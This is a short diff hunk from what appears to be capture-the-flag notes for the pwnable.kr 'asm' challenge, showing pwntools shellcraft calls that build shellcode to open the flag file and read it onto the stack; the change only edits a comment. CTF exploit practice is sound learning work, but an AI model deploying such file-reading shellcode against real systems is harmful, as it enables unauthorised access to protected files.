@@ -489,7 +489,7 @@ flag = ('this_is_pwnable.kr_flag_file_please_read_this' +
         '0o0ong')                                                                                                
                                                                                                                  
 shellcode = shellcraft.open(flag)                                                                                
-# shellcraft.amd64.linux.write(file)                                                                             
+# shellcraft.amd64.linux.open(file)                                                                             
                                                                                                                  
 shellcode += shellcraft.read('rax', 'rsp', 100)                                                                  
 '''                                                                                                              
